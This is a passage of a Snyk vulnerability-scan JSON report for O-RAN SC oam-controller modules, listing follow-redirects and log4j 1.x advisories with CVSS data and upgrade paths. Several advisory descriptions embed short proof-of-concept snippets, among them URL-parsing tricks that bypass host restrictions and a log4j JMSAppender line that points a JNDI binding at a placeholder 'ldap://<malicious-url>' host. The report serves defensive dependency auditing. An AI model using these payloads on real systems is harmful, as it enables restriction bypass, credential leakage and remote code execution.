          "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Handling of Extra Parameters due to the improper handling of URLs by the `url.parse()` function. When `new URL()` throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.\n## PoC\n```js\r\n# Case 1 : Bypassing localhost restriction\r\nlet url = 'http://[localhost]/admin';\r\ntry{\r\n    new URL(url); // ERROR : Invalid URL\r\n}catch{\r\n    url.parse(url); // -> http://localhost/admin\r\n}\r\n\r\n# Case 2 : Bypassing domain restriction\r\nlet url = 'http://attacker.domain*.allowed.domain:a';\r\ntry{\r\n    new URL(url); // ERROR : Invalid URL\r\n}catch{\r\n    url.parse(url); // -> http://attacker.domain/*.allowed.domain:a\r\n}\r\n```\n## Remediation\nUpgrade `follow-redirects` to version 1.15.4 or higher.\n## References\n- [GitHub Issue](https://github.com/follow-redirects/follow-redirects/issues/235)\n- [GitHub PR](https://github.com/follow-redirects/follow-redirects/pull/236)\n",
          "epssDetails": {
            "percentile": "0.24347",
            "probability": "0.00079",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2023-26159"
            ],
            "CWE": [
              "CWE-235"
            ]
          },
          "packageName": "follow-redirects",
          "proprietary": true,
          "creationTime": "2024-01-01T15:17:16.885858Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2023-12-31T22:00:00Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-01-01T15:19:32.295744Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-09-18T11:35:11.342543Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "@odlux/framework@0.1.4",
            "http-server@0.11.2",
            "http-proxy@1.18.1",
            "follow-redirects@1.15.2"
          ],
          "upgradePath": [
            false,
            "http-server@0.11.2",
            "http-proxy@1.18.1",
            "follow-redirects@1.15.11"
          ],
          "isUpgradable": true,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "follow-redirects",
          "version": "1.15.2",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-FOLLOWREDIRECTS-6444610",
          "title": "Information Exposure",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P",
          "credit": [
            "4xpl0r3r"
          ],
          "semver": {
            "vulnerable": [
              "<1.15.6"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [
            "1.15.6"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 6.5,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "follow-redirects",
          "references": [
            {
              "url": "https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b",
              "title": "GitHub Commit"
            },
            {
              "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2269576",
              "title": "RedHat Bugzilla Bug"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "Red Hat",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
              "cvssV3BaseScore": 6.5,
              "modificationTime": "2024-03-15T13:53:13.764710Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 6.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-15T08:02:52.752181Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
              "assigner": "Red Hat",
              "severity": "medium",
              "baseScore": 6.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-15T13:53:13.764710Z"
            }
          ],
          "description": "## Overview\n\nAffected versions of this package are vulnerable to Information Exposure due to the handling of the `Proxy-Authorization` header across hosts. When using a dependent library, it only clears the authorization header during cross-domain redirects but allows the proxy-authentication header, which contains credentials, to persist. This behavior may lead to the unintended leakage of credentials if an attacker can trigger a cross-domain redirect and capture the persistent proxy-authentication header.\n## PoC\n```js\r\nconst axios = require('axios');\r\n\r\naxios.get('http://127.0.0.1:10081/',{\r\nheaders: {\r\n'AuThorization': 'Rear Test',\r\n'ProXy-AuthoriZation': 'Rear Test',\r\n'coOkie': 't=1'\r\n}\r\n}).then(function (response) {\r\nconsole.log(response);\r\n})\r\n```\n## Remediation\nUpgrade `follow-redirects` to version 1.15.6 or higher.\n## References\n- [GitHub Commit](https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2269576)\n",
          "epssDetails": {
            "percentile": "0.44236",
            "probability": "0.00216",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-28849"
            ],
            "CWE": [
              "CWE-200"
            ],
            "GHSA": [
              "GHSA-cxjh-pqwp-8mfp"
            ]
          },
          "packageName": "follow-redirects",
          "proprietary": false,
          "creationTime": "2024-03-15T07:42:59.062346Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-03-14T17:19:42Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-03-15T07:59:52.476336Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-15T13:53:13.764710Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "@odlux/framework@0.1.4",
            "http-server@0.11.2",
            "http-proxy@1.18.1",
            "follow-redirects@1.15.2"
          ],
          "upgradePath": [
            false,
            "http-server@0.11.2",
            "http-proxy@1.18.1",
            "follow-redirects@1.15.11"
          ],
          "isUpgradable": true,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "follow-redirects",
          "version": "1.15.2",
          "severityWithCritical": "medium"
        }
      ],
      "upgrade": {
        "@mui/material@5.13.2": {
          "upgradeTo": "@mui/material@5.16.2",
          "upgrades": [
            "@babel/runtime@7.22.0"
          ],
          "vulns": [
            "SNYK-JS-BABELRUNTIME-10044504"
          ]
        },
        "@mui/styles@5.13.2": {
          "upgradeTo": "@mui/styles@5.18.0",
          "upgrades": [
            "@babel/runtime@7.22.0"
          ],
          "vulns": [
            "SNYK-JS-BABELRUNTIME-10044504"
          ]
        },
        "http-server@0.11.2": {
          "upgradeTo": "http-server@0.13.0",
          "upgrades": [
            "ecstatic@3.3.2",
            "minimist@0.0.10",
            "minimist@0.0.10"
          ],
          "vulns": [
            "SNYK-JS-ECSTATIC-540354",
            "SNYK-JS-MINIMIST-2429795",
            "SNYK-JS-MINIMIST-559764"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 6,
    "projectName": "@odlux/framework",
    "foundProjectCount": 20,
    "displayTargetFile": "features/sdnr/odlux/odlux/framework/package.json",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller/framework"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller:oam-controller",
    "foundProjectCount": 20,
    "displayTargetFile": "pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 1,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.distribution:sdnr-web-distribution",
    "foundProjectCount": 20,
    "displayTargetFile": "distribution/oam-controller-web/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux",
    "foundProjectCount": 20,
    "displayTargetFile": "features/sdnr/odlux/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-top",
    "foundProjectCount": 20,
    "displayTargetFile": "features/sdnr/odlux/helpserver/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [
      {
        "id": "SNYK-JAVA-LOG4J-1300176",
        "title": "Man-in-the-Middle (MitM)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "low",
        "cvssScore": 3.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "log4j:log4j",
        "references": [
          {
            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
            "title": "Atlassian Patch"
          },
          {
            "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b",
            "title": "GitHub Commit"
          },
          {
            "url": "https://issues.apache.org/jira/browse/LOG4J2-2819",
            "title": "Jira Issue"
          },
          {
            "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9",
            "title": "Reload4j Fix Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-03-11T09:51:18.869400Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-03-11T09:53:58.100685Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "Snyk",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-14T11:19:13.272608Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "NVD",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:51:18.869400Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:58.100685Z"
          }
        ],
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project. Note: Log4j 1.x reached End of Life in 2015, and is no longer supported.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
        "epssDetails": {
          "percentile": "0.01688",
          "probability": "0.00014",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-9488"
          ],
          "CWE": [
            "CWE-297"
          ],
          "GHSA": [
            "GHSA-vwqq-5vrc-xw9h"
          ]
        },
        "packageName": "log4j:log4j",
        "proprietary": false,
        "creationTime": "2021-06-04T15:38:41.700520Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-04-27T17:16:14Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "publicationTime": "2020-04-28T17:16:14Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-14T11:19:13.272608Z",
        "socialTrendAlert": false,
        "severityWithCritical": "low",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.slf4j:slf4j-log4j12@1.7.29",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [
          false,
          "org.slf4j:slf4j-log4j12@1.7.34"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "log4j:log4j",
        "version": "1.2.17"
      },
      {
        "id": "SNYK-JAVA-LOG4J-2316893",
        "title": "Arbitrary Code Execution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "medium",
        "cvssScore": 6.6,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "log4j:log4j",
        "references": [
          {
            "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx",
            "title": "Apache Mail"
          },
          {
            "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
            "title": "Atlassian Patch"
          },
          {
            "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301",
            "title": "GitHub Comment"
          },
          {
            "url": "https://github.com/apache/logging-log4j2/pull/608",
            "title": "GitHub Discussion"
          },
          {
            "url": "https://github.com/cckuailong/log4shell_1.x",
            "title": "PoC in GitHub"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:51:51.036694Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:56.367735Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 6.4,
            "modificationTime": "2024-03-11T09:49:44.779921Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:19.065535Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:51:51.036694Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:56.367735Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 6.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:44.779921Z"
          }
        ],
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project. Note: Log4j 1.x reached End of Life in 2015, and is no longer supported.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. <br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n- [PoC in GitHub](https://github.com/cckuailong/log4shell_1.x)\n",
        "epssDetails": {
          "percentile": "0.98704",
          "probability": "0.72202",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-4104"
          ],
          "CWE": [
            "CWE-94"
          ]
        },
        "packageName": "log4j:log4j",
        "proprietary": false,
        "creationTime": "2021-12-13T14:52:40.887231Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2021-12-10T00:00:00Z",
        "exploitDetails": {
          "sources": [
            "PoC in GitHub",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "publicationTime": "2021-12-13T15:31:00Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-07-12T05:20:09.220518Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.slf4j:slf4j-log4j12@1.7.29",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [
          false,
          "org.slf4j:slf4j-log4j12@1.7.34"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "log4j:log4j",
        "version": "1.2.17"
      },
      {
        "id": "SNYK-JAVA-LOG4J-2342645",
        "title": "SQL Injection",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
